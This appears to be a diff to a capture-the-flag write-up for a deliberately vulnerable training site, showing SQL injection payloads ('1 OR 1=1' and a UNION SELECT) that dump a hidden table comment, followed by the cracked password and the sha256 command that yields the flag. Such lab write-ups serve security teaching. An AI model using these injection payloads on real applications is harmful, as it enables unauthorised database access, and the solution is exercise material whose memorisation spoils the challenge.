@@ -21,3 +21,15 @@ Url : https://en.wikipedia.org/wiki/Earth#/med
 ID: 1 OR 1=1 
 Title: Hack me ?
 Url : borntosec.ddns.net/images.png
+
+While resolving member we got to see relationships of tables and column.
+Hence i know the parameter sent on query and column names of a given table on a given database.
+so just
+ID: 1 OR 1=1 UNION SELECT comment,null FROM list_images 
+output:
+    [...]
+    Title: 
+    Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+    [...]
+
+printf '%s' 'albatroz' | sha256sum | awk '{print $1}'
